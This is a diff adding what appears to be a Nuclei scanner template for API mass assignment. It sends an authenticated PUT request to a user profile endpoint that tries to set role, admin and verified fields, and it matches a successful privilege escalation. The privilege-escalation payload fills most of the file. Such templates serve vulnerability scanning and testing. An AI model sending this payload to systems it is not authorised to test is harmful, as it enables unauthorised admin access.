@@ -1,0 +1,22 @@
+id: api-mass-assignment
+info:
+  name: API Mass Assignment
+  author: specter-agent
+  severity: high
+  tags: api,mass-assignment,owasp-api3
+http:
+  - raw:
+      - |
+        PUT /api/v1/users/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{token}}
+        Content-Type: application/json
+
+        {"name":"test","role":"admin","isAdmin":true,"admin":true,"verified":true}
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["admin","true"]
+        condition: and
